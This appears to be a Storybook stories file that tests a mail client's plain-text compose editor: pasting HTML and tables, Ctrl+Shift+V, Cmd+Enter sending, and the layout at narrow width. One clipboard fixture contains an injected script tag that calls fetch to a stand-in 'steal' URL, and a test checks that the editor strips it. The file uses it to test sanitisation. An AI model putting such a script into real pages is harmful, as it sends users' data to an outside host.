import type { Meta, StoryObj } from "@storybook/react";
import { useState } from "react";
import { expect, fn, userEvent } from "storybook/test";
import { ComposeLanguageChip } from "./compose-language-chip.js";
import { ComposeModeToggle } from "./compose-mode-toggle.js";
import { PlainTextEditor } from "./plain-text-editor.js";

const PIPE_TABLE = [
	"| Region | Total |",
	"| --- | --- |",
	"| EMEA | 412 |",
	"| Americas | 388 |",
].join("\n");

const CLIPBOARD_HTML = [
	'<meta charset="utf-8">',
	"<style>.hdr{color:#c00}</style>",
	'<h2 class="hdr" style="color:#c00">Quarterly numbers</h2>',
	"<p>Highlights <strong>this quarter</strong>:</p>",
	"<table><thead><tr><th>Region</th><th>Total</th></tr></thead>",
	"<tbody><tr><td>EMEA</td><td>412</td></tr></tbody></table>",
	'<script>fetch("https://tracker.example/steal")</script>',
].join("");

const CLIPBOARD_TEXT = "Quarterly numbers Highlights this quarter:";

/**
 * The plain surface at the compose body's real geometry: a column with a height
 * of its own and one scroller, which is what the sticky toolbar and the
 * auto-growing textarea are written against.
 */
const Surface = ({
	initial = "",
	onSubmit,
}: {
	initial?: string;
	onSubmit?: () => void;
}) => {
	const [text, setText] = useState(initial);
	const [mode, setMode] = useState<"rich" | "plain">("plain");
	const [language, setLanguage] = useState("nl");
	return (
		<PlainTextEditor
			value={text}
			onChange={setText}
			onSubmit={onSubmit}
			lang={language}
			trailing={
				<>
					<ComposeLanguageChip
						language={language}
						languages={["nl", "en", "de"]}
						source="detected"
						onSelect={setLanguage}
					/>
					<ComposeModeToggle
						mode={mode}
						onToggle={() => setMode(mode === "plain" ? "rich" : "plain")}
					/>
				</>
			}
		/>
	);
};

const meta: Meta<typeof Surface> = {
	title: "Mail/PlainTextEditor",
	component: Surface,
	parameters: { layout: "centered" },
	decorators: [
		(Story) => (
			<div
				data-testid="body-area"
				className="flex h-[420px] w-[640px] flex-col overflow-auto rounded-md border border-line bg-canvas"
			>
				<Story />
			</div>
		),
	],
};
export default meta;

type Story = StoryObj<typeof Surface>;

const dispatchPaste = async (
	canvasElement: HTMLElement,
	flavours: { html?: string; text?: string },
) => {
	const textarea = canvasElement.querySelector<HTMLTextAreaElement>(
		"[data-testid=compose-body-plain]",
	);
	if (!textarea) throw new Error("the plain surface is not mounted");
	textarea.focus();
	const data = new DataTransfer();
	if (flavours.html !== undefined) data.setData("text/html", flavours.html);
	if (flavours.text !== undefined) data.setData("text/plain", flavours.text);
	textarea.dispatchEvent(
		new ClipboardEvent("paste", {
			bubbles: true,
			cancelable: true,
			clipboardData: data,
		}),
	);
	return textarea;
};

export const Empty: Story = { name: "Empty" };

export const WrittenNote: Story = {
	name: "A written note",
	args: {
		initial:
			"Thanks — that works for me.\n\nI'll send the deck tomorrow morning, before the standup.",
	},
};

/** Monospace with no soft wrap, so the columns line up as a table. */
export const PastedTable: Story = {
	name: "Holding a pasted pipe table",
	args: { initial: `Numbers for the quarter:\n\n${PIPE_TABLE}\n` },
};

export const PasteHtml: Story = {
	name: "Pasting a web page",
	play: async ({ canvasElement }) => {
		const textarea = await dispatchPaste(canvasElement, {
			html: CLIPBOARD_HTML,
			text: CLIPBOARD_TEXT,
		});

		await expect(textarea.value).toContain("## Quarterly numbers");
		await expect(textarea.value).toContain("| EMEA | 412 |");
		await expect(textarea.value).not.toContain("<script");
		await expect(textarea.value).not.toContain("style=");
	},
};

export const PasteTextOnly: Story = {
	name: "Pasting a clipboard with no HTML",
	play: async ({ canvasElement }) => {
		const textarea = await dispatchPaste(canvasElement, {
			text: "Ship it on Friday.",
		});

		await expect(textarea.value).toBe("Ship it on Friday.");
	},
};

/** `Ctrl+Shift+V` takes the text flavour, matching Gmail and Apple Mail. */
export const PastePlainRequested: Story = {
	name: "Ctrl+Shift+V takes the text flavour",
	play: async ({ canvasElement }) => {
		const textarea = canvasElement.querySelector<HTMLTextAreaElement>(
			"[data-testid=compose-body-plain]",
		);
		if (!textarea) throw new Error("the plain surface is not mounted");
		textarea.focus();
		textarea.dispatchEvent(
			new KeyboardEvent("keydown", {
				bubbles: true,
				cancelable: true,
				key: "v",
				ctrlKey: true,
				shiftKey: true,
			}),
		);
		await dispatchPaste(canvasElement, {
			html: CLIPBOARD_HTML,
			text: CLIPBOARD_TEXT,
		});

		await expect(textarea.value).toBe(CLIPBOARD_TEXT);
		await expect(textarea.value).not.toContain("|");
	},
};

/**
 * The one paste that gets a notice is the one that inserts nothing. A paste with
 * no visible result is the dead button the repo's error rule forbids.
 */
export const PasteWithNothingInIt: Story = {
	name: "Pasting an image on its own",
	play: async ({ canvasElement }) => {
		const textarea = await dispatchPaste(canvasElement, {
			html: '<img src="https://example.com/cat.png">',
			text: "",
		});

		await expect(textarea.value).toBe("");
		await expect(canvasElement.textContent).toContain(
			"Nothing to paste. The copied content was an image, or had no text in it.",
		);
	},
};

export const CommandEnterSends: Story = {
	name: "Cmd+Enter sends",
	args: { initial: "Ready to go.", onSubmit: fn() },
	play: async ({ args, canvasElement }) => {
		const textarea = canvasElement.querySelector<HTMLTextAreaElement>(
			"[data-testid=compose-body-plain]",
		);
		if (!textarea) throw new Error("the plain surface is not mounted");

		await userEvent.click(textarea);
		await userEvent.keyboard("{Meta>}{Enter}{/Meta}");

		await expect(args.onSubmit).toHaveBeenCalled();
	},
};

/**
 * At 390 the toggle stays reachable: the label is the last element in the
 * toolbar's DOM and is pinned outside anything that scrolls.
 */
export const Narrow: Story = {
	name: "At 390",
	args: { initial: PIPE_TABLE },
	decorators: [
		(Story) => (
			<div className="flex h-[420px] w-[390px] flex-col overflow-auto rounded-md border border-line bg-canvas">
				<Story />
			</div>
		),
	],
	play: async ({ canvasElement }) => {
		const toggle = canvasElement.querySelector<HTMLElement>(
			"[data-testid=compose-mode-toggle]",
		);
		const frame = canvasElement.firstElementChild;
		if (!toggle || !frame) throw new Error("the toolbar is not mounted");

		const toggleBox = toggle.getBoundingClientRect();
		const frameBox = frame.getBoundingClientRect();
		await expect(toggleBox.right).toBeLessThanOrEqual(frameBox.right + 1);
		await expect(toggle).toHaveAttribute("aria-pressed", "true");
	},
};
